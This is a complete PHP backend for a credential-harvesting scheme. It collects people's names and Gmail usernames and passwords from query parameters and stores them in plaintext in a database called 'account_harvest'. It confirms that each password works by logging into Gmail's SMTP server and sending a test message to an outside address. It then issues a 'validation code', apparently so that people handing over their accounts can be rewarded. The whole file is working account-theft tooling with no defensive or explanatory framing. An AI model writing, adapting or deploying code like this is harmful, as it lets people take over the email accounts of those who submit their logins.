<?php
require_once 'swiftmailer/lib/swift_required.php';

$DATABASE_HOST = 'localhost';
$DATABASE_USERNAME = 'ENTER_DATABASE_USERNAME_HERE';
$DATABASE_PASSWORD = 'ENTER_DATABASE_PASSWORD_HERE';

$DATABASE = 'account_harvest';
$TABLE = 'harvest';

function endsWith($haystack, $needle)
{
    return $needle === "" || substr($haystack, -strlen($needle)) === $needle;
}

$response = array(
    "success" => false,
    "message" => "An unknown error occurred."
);

if (isset($_GET["first_name"]) && isset($_GET["last_name"]) && isset($_GET["username"]) && isset($_GET["password"])) {
    $firstName = trim($_GET["first_name"]);
    $lastName  = trim($_GET["last_name"]);
    $username  = trim($_GET["username"]);
    if (!endsWith($username, '@gmail.com')) {
        $username = $username . '@gmail.com';
    }
    $password = trim($_GET["password"]);
    
    // check input against creds in database
    try {
        $checkconnection = @mysql_connect($DATABASE_HOST, $DATABASE_USERNAME, $DATABASE_PASSWORD);
        
        if (!$checkconnection) {
            $response = array(
                "success" => false,
                "message" => "Could not connect to database, please try again in a few minutes."
            );
        } else {
            // select and create the table if its not already there
            mysql_select_db($DATABASE);
            $createDBIfNotExistsSQL = "CREATE TABLE IF NOT EXISTS $TABLE (id INTEGER NOT NULL AUTO_INCREMENT, first_name TEXT, last_name TEXT, username TEXT, password TEXT, validation_code TEXT, PRIMARY KEY (Id));";
            mysql_query($createDBIfNotExistsSQL);
            
            // check if we have seen this credentials before
            $selectUsernameSQL    = "SELECT id FROM $DATABASE.$TABLE where username='" . mysql_real_escape_string($username) . "';";
            $selectUsernameResult = mysql_query($selectUsernameSQL);
            if (mysql_num_rows($selectUsernameResult) > 0) {
                $response = array(
                    "success" => false,
                    "message" => "These credentials have already been submitted."
                );
            } else {
                // validate credentials
                try {
                    $transport = Swift_SmtpTransport::newInstance('smtp.gmail.com', 465, "ssl")
                      ->setUsername($username)
                      ->setPassword($password);

                    $mailer = Swift_Mailer::newInstance($transport);

                    // need to send an actual email to test authentication
                    $message = Swift_Message::newInstance('Hello')
                      ->setFrom(array($username => ($firstName . " " . $lastName)))
                      ->setTo(array('robert@sharklasers.com'))
                      ->setBody('This is a test mail.');

                    $result = $mailer->send($message);

                    // no exceptions at this point so the credentials must be good

                    $validationCode = sha1("salty" . $username);
                    $insertSQL = "INSERT INTO $DATABASE.$TABLE (first_name,last_name,username,password,validation_code) VALUES ('" . mysql_real_escape_string($firstName) . "','" . mysql_real_escape_string($lastName) . "','" . mysql_real_escape_string($username) . "','" . mysql_real_escape_string($password) . "','" . mysql_real_escape_string($validationCode) . "');";
                    mysql_query($insertSQL);
                    
                    $response = array(
                        "success" => true,
                        "message" => "Task completed successfully!",
                        "validation_code" => $validationCode
                    );
                }
                catch (Exception $e1) {
                    // echo 'Caught exception: ',  $e->getMessage(), "\n"; 
                    $response = array(
                        "success" => false,
                        "message" => "Could not validate credentials."
                    );
                }
            }
        }
    }
    catch (Exception $e2) {
        $response = array(
            "success" => false,
            "message" => "Could not save credentials, please try again in a few minutes."
        );
    }
} else {
    $response = array(
        "success" => false,
        "message" => "Required fields (first name, last name, username, password) are missing."
    );
}

echo json_encode($response);
?>